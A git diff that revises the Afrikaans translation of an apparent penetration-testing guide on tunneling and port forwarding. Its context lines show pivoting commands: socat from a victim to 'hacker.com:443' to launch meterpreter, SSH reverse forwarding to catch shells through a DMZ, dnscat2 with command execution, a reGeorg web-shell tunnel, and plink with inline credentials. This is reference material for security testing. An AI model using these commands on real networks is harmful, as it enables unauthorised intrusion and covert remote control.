@@ -1,15 +1,15 @@
-# Tunneling en Poort Voorwaartse
+# Tunneling en Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
 ## Nmap wenk
 
 > [!WARNING]
-> **ICMP** en **SYN** skande kan nie deur socks proxies getunnel word nie, so ons moet **ping ontdekking deaktiveer** (`-Pn`) en **TCP skande** (`-sT`) spesifiseer vir dit om te werk.
+> **ICMP** en **SYN** skande kan nie deur socks-proxies getunnel word nie, so ons moet **ping ontdekking deaktiveer** (`-Pn`) en **TCP skande** (`-sT`) spesifiseer vir dit om te werk.
 
 ## **Bash**
 
-**Gasheer -> Spring -> InternA -> InternB**
+**Gastheer -> Spring -> InternA -> InternB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -33,7 +33,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Plaaslike Port2Port
 
-Maak nuwe Port in SSH-bediener --> Ander port
+Maak nuwe Poort in SSH-bediener --> Ander poort
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -55,9 +55,9 @@ Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enige plek
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Omgekeerde Poort Voorwaartse
+### Reverse Port Forwarding
 
-Dit is nuttig om omgekeerde skale van interne gasheer deur 'n DMZ na jou gasheer te kry:
+Dit is nuttig om omgekeerde shells van interne gasheer deur 'n DMZ na jou gasheer te kry:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -95,7 +95,7 @@ Byvoorbeeld, om al die verkeer wat na 10.10.10.0/24 gaan, te stuur.
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-Verbind met 'n private sleutel
+Verbind met 'n privaat sleutel
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS-proxy
 
-Maak 'n poort in die spanbediener oop wat op al die interfaces luister wat gebruik kan word om die **verkeer deur die beacon te lei**.
+Maak 'n poort op die spanbediener oop wat op al die interfaces luister wat gebruik kan word om die **verkeer deur die beacon te lei**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -168,13 +168,13 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Jy moet 'n weblêer tonnel oplaai: ashx|aspx|js|jsp|php|php|jsp
+Jy moet 'n weblêer-tunnel oplaai: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
 ## Chisel
 
-Jy kan dit aflaai vanaf die vrystellingsbladsy van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Jy kan dit aflaai vanaf die vrylating bladsy van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
 Jy moet die **dieselfde weergawe vir kliënt en bediener** gebruik.
 
 ### socks
@@ -238,7 +238,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
 Omgekeerde tonnel. Die tonnel word vanaf die slagoffer begin.\
-'n socks4-proxy word op 127.0.0.1:1080 geskep
+'n socks4 proxy word op 127.0.0.1:1080 geskep
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -286,15 +286,17 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-U kan 'n **nie-geoutentiseerde proxy** omseil deur hierdie lyn in plaas van die laaste een in die slagoffer se konsole uit te voer:
+Jy kan 'n **nie-geoutentiseerde proxy** omseil deur hierdie lyn in plaas van die laaste een in die slagoffer se konsole uit te voer:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
 ### SSL Socat Tunnel
 
-**/bin/sh console**
+**/bin/sh konsole**
 
-Skep sertifikate aan beide kante: Kliënt en Bediener
+Skep sertifikate aan albei kante: Kliënt en Bediener
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -320,7 +322,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Dit is soos 'n konsole PuTTY weergawe (die opsies is baie soortgelyk aan 'n ssh kliënt).
 
-Aangesien hierdie binêre op die slagoffer uitgevoer sal word en dit 'n ssh kliënt is, moet ons ons ssh diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs 'n plaaslik toeganklike poort na 'n poort op ons masjien te stuur:
+Aangesien hierdie binêre in die slagoffer uitgevoer sal word en dit 'n ssh kliënt is, moet ons ons ssh diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs 'n plaaslik toeganklike poort na 'n poort in ons masjien te stuur:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -354,7 +356,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Nou kan ons **verbinde** met die **slagoffer** oor **RDP** met **`mstsc.exe`**, en ons behoort 'n **prompt** te ontvang wat sê dat die **SocksOverRDP plugin geaktiveer is**, en dit sal **luister** op **127.0.0.1:1080**.
 
-**Verbind** via **RDP** en laai op & voer die `SocksOverRDP-Server.exe` binêre in die slagoffer masjien uit:
+**Verbind** via **RDP** en laai op & voer die `SocksOverRDP-Server.exe` binêre uit op die slagoffer masjien:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -381,8 +383,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, deurgegee word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
-Byvoorbeeld, dit gee die poort 443 deur.
+Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, voortgelei word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
+Byvoorbeeld, dit lei poort 443 voort.
 ```
 Username Alice
 Password P@ssw0rd
@@ -390,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Nou, as jy byvoorbeeld in die slagoffer die **SSH** diens stel om op poort 443 te luister. Jy kan dit deur die aanvaller se poort 2222 verbind.\
+Nou, as jy byvoorbeeld in die slagoffer die **SSH** diens op poort 443 stel om te luister. Jy kan dit deur die aanvaller se poort 2222 verbind.\
 Jy kan ook 'n **meterpreter** gebruik wat met localhost:443 verbind en die aanvaller luister op poort 2222.
 
 ## YARP
@@ -403,7 +405,7 @@ Jy kan ook 'n **meterpreter** gebruik wat met localhost:443 verbind en die aanva
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root is nodig in beide stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
+Root is nodig in albei stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -433,7 +435,7 @@ Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershel
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Port forwarding met dnscat**
+#### **Poort deurstuur met dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
@@ -478,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **is 'n hulpmiddel om oplossings in een opdraglyn aan die internet bloot te stel.**\
-&#xNAN;_&#x45;xposition URI is soos:_ **UID.ngrok.io**
+_&#x45;xposition URI is soos:_ **UID.ngrok.io**
 
 ### Installasie
 
